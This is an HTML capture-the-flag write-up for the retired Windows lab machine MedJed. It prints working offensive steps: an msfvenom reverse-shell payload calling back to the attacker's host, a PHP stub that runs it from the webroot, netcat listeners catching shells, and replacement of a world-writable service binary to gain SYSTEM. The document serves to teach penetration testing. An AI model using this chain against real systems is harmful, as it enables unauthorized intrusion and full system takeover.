@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MedJed &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>MedJed</h1>
+    <div class="meta">Target: <code>192.168.206.127</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">WebDAV</span><span class="tag">FTP</span><span class="tag">BarracudaDrive</span><span class="tag">SQLi</span><span class="tag">msfvenom</span><span class="tag">ServiceHijack</span><span class="tag">CVE</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#anonymous-ftp-port-30021">Anonymous FTP (port 30021)</a><a class="lvl3" href="#port-8000-barracudadrive-file-manager">Port 8000, BarracudaDrive File Manager</a><a class="lvl3" href="#port-33033-rails-app-with-sqli-leak">Port 33033, Rails App with SQLi Leak</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#rce-via-barracudadrive-xampp-webroot">RCE via BarracudaDrive + XAMPP Webroot</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#barracudadrive-bd-exe-service-hijack-exploitdb-48789">BarracudaDrive bd.exe Service Hijack (ExploitDB 48789)</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>MedJed is a Windows machine that puts an overwhelming number of ports on the table, then rewards the attacker for working through them methodically. The path chains three distinct services: an anonymous FTP server exposing a Rails app's directory structure, a BarracudaDrive web file manager that gives access to the full filesystem, and a Ruby on Rails web app with a broken password reset that leaks the SQL query powering it. RCE comes from writing a PHP runner through the file manager into the XAMPP webroot. Privilege escalation abuses a known BarracudaDrive insecure folder permission (ExploitDB 48789) that lets any authenticated user replace the <code>bd.exe</code> service binary.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE     VERSION
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3306/tcp  open  mysql        # MariaDB: external connections denied
+8000/tcp  open  http-alt     BarracudaServer.com (Windows)
+30021/tcp open  ftp          FileZilla ftpd 0.9.41 beta
+33033/tcp open  unknown      # Rails app (403 on GET → ActionController exception)
+44330/tcp open  ssl/unknown
+45332/tcp open  http         Apache httpd 2.4.46 (Win64) PHP/7.3.23 — Quiz App
+45443/tcp open  http         Apache httpd 2.4.46 (Win64) PHP/7.3.23
+</code></pre>
+<p>The sheer number of ports is the first puzzle. Key observations: port 8000 identifies itself as BarracudaServer; port 30021 allows anonymous FTP; port 33033 throws a Rails exception page on GET, which leaks framework internals.</p>
+<blockquote>
+<p><strong>Why a crowded port list matters:</strong> each service is a separate attack surface with its own trust boundary. The attacker's job is not to exploit everything, but to find which services can be chained. Here, FTP + BarracudaDrive file manager + XAMPP webroot form the winning chain.</p>
+</blockquote>
+<h3 id="anonymous-ftp-port-30021">Anonymous FTP (port 30021)</h3>
+<p>FileZilla ftpd accepted anonymous login without a password and exposed what looked like the webroot of a Rails application:</p>
+<pre><code class="language-sh">ftp 192.168.206.127 30021
+Name: Anonymous
+230 Logged on
+
+-r--r--r-- 1 ftp ftp   536  Nov 03 2020 .gitignore
+drwxr-xr-x 1 ftp ftp     0  Nov 03 2020 app
+drwxr-xr-x 1 ftp ftp     0  Nov 03 2020 config
+-r--r--r-- 1 ftp ftp  1750  Nov 03 2020 Gemfile
+drwxr-xr-x 1 ftp ftp     0  Nov 03 2020 public
+</code></pre>
+<p>The structure confirmed a Ruby on Rails app was hosted somewhere. The FTP root also serves as a potential file-drop location for later use.</p>
+<h3 id="port-8000-barracudadrive-file-manager">Port 8000, BarracudaDrive File Manager</h3>
+<p>Navigating to the setup wizard created a local admin account:</p>
+<pre><code>http://192.168.206.127:8000/Config-Wizard/wizard/SetAdmin.lsp
+</code></pre>
+<p>Once authenticated, the web file manager at <code>/fs/</code> exposed the entire Windows filesystem with upload and download capability. Browsing to <code>C:\xampp\htdocs\</code> confirmed the XAMPP webroot, the place where files dropped here become web-accessible and executable as PHP.</p>
+<h3 id="port-33033-rails-app-with-sqli-leak">Port 33033, Rails App with SQLi Leak</h3>
+<p>The landing page listed company employees with names and email addresses, including:</p>
+<pre><code>Jerren Valon - jerren.devops@company.com
+</code></pre>
+<p>A password reset feature accepted a username with no verification. Resetting Jerren's password:</p>
+<pre><code>Username: jerren.devops
+Reminder: paranoid
+New Password: admin
+</code></pre>
+<p>After logging in, an "experimental" profile-slug field accepted SQL metacharacters. Entering a single quote exposed the raw query:</p>
+<pre><code class="language-sql">sql = &quot;SELECT username FROM users WHERE username = '&quot; + params[:URL].to_s + &quot;'&quot;
+</code></pre>
+<p>The injection was confirmed but not exploited further, because the file manager gave a more direct path to RCE.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="rce-via-barracudadrive-xampp-webroot">RCE via BarracudaDrive + XAMPP Webroot</h3>
+<p>The file manager could write to <code>C:\xampp\htdocs\</code>, the XAMPP webroot, served by Apache on port 45332. The plan: upload a reverse-shell exe, plant a PHP stub that executes it, then trigger the PHP file via the browser.</p>
+<p>Payload generation:</p>
+<pre><code class="language-sh">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=45332 -f exe &gt; reverse.exe
+</code></pre>
+<p>PHP stub written into the webroot via the BarracudaDrive file manager (<code>/fs/C/xampp/htdocs/run.php</code>):</p>
+<pre><code class="language-php">&lt;?php
+$exec = system('C:/Users/Jerren/Desktop/reverse.exe', $val)
+?&gt;
+</code></pre>
+<p>The reverse.exe was uploaded to <code>C:\Users\Jerren\Desktop\</code> through the file manager as well.</p>
+<p>Triggering the chain:</p>
+<pre><code>GET 192.168.206.127:45332/run.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 45332
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.127] 50689
+
+C:\xampp\htdocs&gt;whoami
+medjed\jerren
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="barracudadrive-bd-exe-service-hijack-exploitdb-48789">BarracudaDrive bd.exe Service Hijack (ExploitDB 48789)</h3>
+<p>WinPEAS identified world-writable permissions on the BarracudaDrive service binary:</p>
+<pre><code>C:\bd\bd.exe
+</code></pre>
+<p>This matches ExploitDB 48789: <strong>BarracudaDrive v6.5, Insecure Folder Permissions</strong>. The service binary runs as <code>SYSTEM</code>, and its containing directory is writable by low-privilege users. Replacing the binary means the next service start executes attacker-controlled code as <code>SYSTEM</code>.</p>
+<blockquote>
+<p><strong>How insecure folder permissions become SYSTEM:</strong> Windows service binaries are launched by the Service Control Manager under the account configured in the service definition, often <code>LocalSystem</code>. If the binary path sits in a directory where a non-admin user has write access, swapping the binary is equivalent to rewriting the service. No exploit needed; it's a misconfigured ACL.</p>
+</blockquote>
+<p>The existing <code>bd.exe</code> was renamed rather than deleted (the <code>move</code> command worked where <code>del</code> had failed):</p>
+<pre><code class="language-powershell">move bd.exe bd.service.exe
+</code></pre>
+<p>The same reverse-shell exe was already on disk. After placing it as the new <code>bd.exe</code> and issuing a reboot:</p>
+<pre><code class="language-powershell">shutdown /r
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>The listener was restarted immediately. As the machine came back up, the BarracudaDrive service started, executed the planted binary, and connected back:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 45332
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.127] 49668
+
+C:\WINDOWS\system32&gt;whoami
+nt authority\system
+</code></pre>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt;type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Anonymous FTP leaking a webroot structure sets the recon agenda.</strong> The Rails directory tree showed the app tech stack before a single HTTP request was made.</li>
+<li><strong>Web file managers that expose the full filesystem are essentially root.</strong> BarracudaDrive's <code>/fs/</code> endpoint let an unprivileged user write PHP files into a live webroot, no need to exploit the file manager itself.</li>
+<li><strong>WinPEAS writable service binaries are immediate targets.</strong> Any <code>SERVICE_START_NAME: LocalSystem</code> entry whose binary path sits in a user-writable directory is an instant SYSTEM if you can survive a reboot.</li>
+<li><strong>Password resets with no identity verification leak usernames and open lateral-move paths.</strong> The Rails app's SQLi disclosure was a bonus, the real win was the unauthenticated password reset handing over a valid session.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
